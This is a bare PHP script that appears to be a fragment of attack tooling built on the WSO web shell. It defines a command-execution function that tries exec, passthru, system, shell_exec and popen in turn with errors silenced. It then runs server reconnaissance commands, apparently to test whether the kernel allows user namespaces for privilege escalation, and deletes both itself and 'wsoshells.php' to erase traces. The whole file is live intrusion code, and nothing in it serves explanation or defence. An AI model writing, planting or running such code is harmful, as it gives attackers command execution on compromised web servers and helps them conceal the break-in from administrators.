<?php
function wsoEx($in)
{
    $out = '';
    if (function_exists('exec'))
    {
        @exec($in, $out);
        $out = @join("\n", $out);
    }
    elseif (function_exists('passthru'))
    {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
    }
    elseif (function_exists('system'))
    {
        ob_start();
        @system($in);
        $out = ob_get_clean();
    }
    elseif (function_exists('shell_exec'))
    {
        $out = shell_exec($in);
    }
    elseif (is_resource($f = @popen($in, "r")))
    {
        $out = "";
        while (!@feof($f)) $out .= fread($f, 1024);
        pclose($f);
    }
    return  "<pre>".$out."</pre>";
}

$result = wsoEx('cat /proc/sys/user/max_user_namespaces;php --version');
echo $result;

unlink(basename($_SERVER['PHP_SELF']));
unlink(__FILE__);

@unlink('wsoshells.php');
?>